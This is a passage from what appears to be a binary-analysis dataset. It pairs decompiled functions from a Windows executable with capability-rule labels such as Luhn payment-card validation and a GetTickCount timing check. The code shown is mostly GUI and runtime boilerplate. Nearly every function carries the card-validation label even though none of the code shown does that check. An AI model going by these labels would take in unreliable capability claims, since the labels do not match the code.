*in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x46d67c;\n                puStack32 = &fcn.0046d608::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x46d688;\n                fcn.00404610();\n                uStack48 = 0x46d6c7;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.0046d608::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.0046d5c4();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x46d6ce;\n                uStack48 = 0x46d6c6;\n                uVar3 = fcn.00404640();\n                return uVar3;\n            }\n            puStack32 = 0x46d648;\n            iVar1 = fcn.0046cdd8();\n            if (iVar1 != 0) goto code_r0x0046d655;\n            var_1h._0_1_ = 1;\n            goto code_r0x0046d6eb;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0046d6eb:\n    return var_1h;\n}\n",
        "token_count": 644
    },
    "0046d754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d754(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041fa00();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.0046d6f8(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 165
    },
    "0046da40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046da40(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x46da5f;\n    iVar1 = fcn.0042018c(0);\n    uStackY44 = 0x46daa0;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.0046cba4();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x46daa7;\n    iStackY48 = 0x46da9f;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 242
    },
    "0046e618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e618(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0046ea58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046ea58(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff94();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 195
    },
    "004714f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004714f8(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x4a490c;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x4a490c = 0;\n    uStack36 = 0x4715a9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    *0x4a4908 = 1;\n    uStack48 = 0x47156b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004714a8, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x4a4908 = 0;\n    *0x4a490c = uVar1;\n    return;\n}\n",
        "token_count": 299
    },
    "0047170c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nuint64_t fcn.0047170c(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    code *pcVar2;\n    uint uStack12;\n    uchar uStack8;\n    \n    uStack12 = sub.user32.dll_GetActiveWindow();\n    uStack8 = 0;\n    if (in_AL == '\\0') {\n        pcVar2 = fcn.004716b4;\n        uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004716b4, &uStack12);\n        sub.user32.dll_EnumThreadWindows(uVar1);\n    }\n    else {\n        pcVar2 = fcn.004716d4;\n        sub.user32.dll_EnumWindows(fcn.004716d4, &uStack12);\n    }\n    return CONCAT44(pcVar2, pcVar2) & 0xffffffff000000ff;\n}\n",
        "token_count": 191
    },
    "00471978": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00471978(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4719e9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.00471968();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407480();\n        fcn.0040da34(in_stack_ffffffd4, arg_ch);\n        fcn.00404eb4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x4719f0;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 289
    },
    "004719f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004719f8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 324
    },
    "00472598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00472598(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00461be4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x47260c;\n    uVar1 = fcn.004719f8(0);\n    *(in_EAX + 0x250) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.004719f8(1);\n    *(in_EAX + 0x254) = uVar1;\n    *(in_EAX + 600) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 251
    },
    "00472984": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472984(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x250) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x254) + 0x1a);\n        fcn.0045e9d4(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.0045ea84();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.0045e9d4();\n        fcn.0045ea84();\n        if (iVar5 < 0) {\n            fcn.004721f4();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.0045e8c0();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.0045e8c0();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.0045e8c0();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.0045e8c0(iVar6, iVar7, iVar3);\n                fcn.004721f4();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.004721f4();\n        }\n        else {\n            iVar5 = fcn.0045e904();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.0045e904();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.0045e904();\n                }\n                fcn.0045e904();\n                fcn.004721f4();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 575
    },
    "00472ba4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00472ba4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    in_EAX[0x97] = in_EAX[0x97] + 1;\n    uStack24 = 0x472c10;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.004650f8();\n    (**(*in_EAX + 0xe0))();\n    *in_FS_OFFSET = uStack28;\n    in_EAX[0x97] = in_EAX[0x97] + -1;\n    return;\n}\n",
        "token_count": 179
    },
    "00472d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472d5c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x472dbd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.00465ff4();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 221
    },
    "00472dec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00472dec(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x472e0a;\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x472f50;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x472e2c;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x4a513c + 0x14))();\n    uStack320 = 0x472f30;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x472e4b;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xf0))();\n    puStack332 = 0x472e53;\n    iVar2 = fcn.00404518();\n    if ((iVar2 != *0x46fec0) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) | 1;\n        uStack336 = 0x472ef8;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.004193d0();\n        if (cVar1 == '\\0') {\n            fcn.00404520();\n            var_10h = &fcn.00472dec::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.00472dec::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.00407480();\n            fcn.0040da34(in_stack_fffffea4, arg_ch);\n            fcn.00404eb4();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x472f37;\n    uStack324 = 0x472f2f;\n    (**(***0x4a513c + 0x18))();\n    return;\n}\n",
        "token_count": 780
    },
    "00473e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473e10(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00467210(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.0041fcb0(),  -1 < var_8h + -1)) {\n        do {\n            fcn.0041fc84();\n            cVar1 = fcn.0040483c();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00477afc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00477afc(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x34c)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "004786e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004786e4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x478751;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xf4))();\n    if (cVar1 != '\\0') {\n        fcn.0040483c();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00478858();\n        }\n    }\n    else {\n        in_EAX[0xa5] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 199
    },
    "004793c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004793c8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.0046565c();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 66
    },
    "00479644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00479644(void)\n\n{\n    uint uStack20;\n    \n    fcn.004796ac();\n    return uStack20;\n}\n",
        "token_count": 33
    },
    "0047965c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0047965c(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.004796ac();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 50
    },
    "00479678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00479678(void)\n\n{\n    uint uStack16;\n    \n    fcn.004796ac();\n    return uStack16;\n}\n",
        "token_count": 33
    },
    "00479690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00479690(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.004796ac();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 49
    },
    "004796ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004796ac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x4a4d20)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 137
    },
    "004796dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004796dc(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x4a4d20)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 149
    },
    "00479e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00479e80(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint auStack28 [3];\n    \n    puVar7 = auStack28;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(auStack28);\n            uVar1 = sub.user32.dll_WindowFromPoint(puVar7, auStack28[0]);\n            if (uVar1 != 0) {\n                iVar6 = 0;\n                uVar4 = uVar1;\n                iVar2 = sub.user32.dll_GetWindowThreadProcessId(uVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = sub.user32.dll_SendMessageA(uVar1, 0x84, 0, uVar4 & 0xffff | iVar6 << 0x10);\n                    sub.user32.dll_SendMessageA(uVar1, 0x20, uVar1, uVar4 & 0xffff | 0x2000000);\n                    return;\n                }\n            }\n        }\n        uVar5 = fcn.00479e58();\n        sub.user32.dll_SetCursor(uVar5);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 393
    },
    "0047a0a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0047a0a0(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        iVar2 = fcn.00473b94();\n        uVar1 = fcn.00473b94();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x02') {\n        iVar3 = fcn.00473b94();\n        iVar2 = *(param_2 + 0x4c);\n        iVar4 = fcn.00473b94();\n        uVar1 = iVar4 + *(in_EAX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x03') {\n        iVar2 = fcn.00473b74();\n        uVar1 = fcn.00473b74();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x04') {\n        iVar3 = fcn.00473b74();\n        iVar2 = *(param_2 + 0x48);\n        iVar4 = fcn.00473b74();\n        uVar1 = iVar4 + *(in_EAX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 394
    },
    "0047a48c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047a48c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x47a4a1;\n    cVar1 = fcn.0047a434(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00404610();\n        uStack28 = 0x47a506;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.0047a2e4(&stack0xfffffffc);\n        fcn.0047a2e4(&stack0xfffffffc);\n        fcn.0047a2e4(&stack0xfffffffc);\n        fcn.0047a2e4(&stack0xfffffffc);\n        fcn.0047a2e4(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x47a505;\n        fcn.00404640();\n        return;\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0047b0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047b0f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    iVar1 = func_0x00408148(arg_8h, 4);\n    if ((iVar1 == 0) || (iVar1 == *(*0x4ab078 + 0x30))) {\n        var_4h = 0;\n    }\n    else {\n        func_0x00408190(iVar1, &var_4h);\n    }\n    iVar2 = sub.kernel32.dll_GetCurrentProcessId();\n    if (iVar2 == var_4h) {\n        iVar2 = fcn.0041966c();\n        if (iVar2 < 0) {\n            fcn.004194b8();\n        }\n    }\n    if ((((iVar1 != 0) && (arg_8h != *(*0x4ab078 + 0x30))) && (iVar1 == *(*0x4ab078 + 0x30))) && (arg_8h != arg_ch)) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040669c();\n            fcn.00406858(iVar1 + 1);\n            iVar1 = fcn.0040669c();\n            *(*0x4ab09c + -4 + iVar1 * 4) = arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 347
    },
    "0047b458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047b458(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.0047bb4c();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 135
    },
    "0047becc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0047becc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar4 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n        puStack28 = 0x47bef7;\n        iVar2 = sub.user32.dll_GetCapture();\n        if (iVar2 == 0) {\n            iVar2 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar2 != *(*(in_EAX + 0x44) + 0x29c))) {\n                while( true ) {\n                    puStack28 = 0x47bf26;\n                    cVar1 = fcn.0045ba00();\n                    if ((cVar1 != '\\0') || (iVar2 == 0)) break;\n                    iStack24 = iVar2;\n                    iVar2 = sub.user32.dll_GetParent();\n                }\n                if (iVar2 == 0) {\n                    iVar2 = *param_2;\n                }\n            }\n            else {\n                puStack28 = 0x47bf13;\n                iVar2 = fcn.00466ca8();\n            }\n            puStack28 = iVar2;\n            iVar3 = sub.user32.dll_IsWindowUnicode();\n            if (iVar3 == 0) {\n                iVar2 = func_0x00408318(iVar2, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n            else {\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageW();\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n        else {\n            puStack28 = &stack0xffffffe8;\n            func_0x00408190(iVar2);\n            uVar5 = *(in_EAX + 0x30);\n            func_0x00408190(uVar5, &stack0xffffffe4);\n            if (iStack24 == iStack20) {\n                puStack28 = param_2[3];\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageA(uVar5, param_2[1] + 0xbc00, param_2[2]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 634
    },
    "0047c210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047c210(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0047c0fc();\n    if (cVar1 == '\\0') {\n        fcn.0047cab4();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "0047c320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
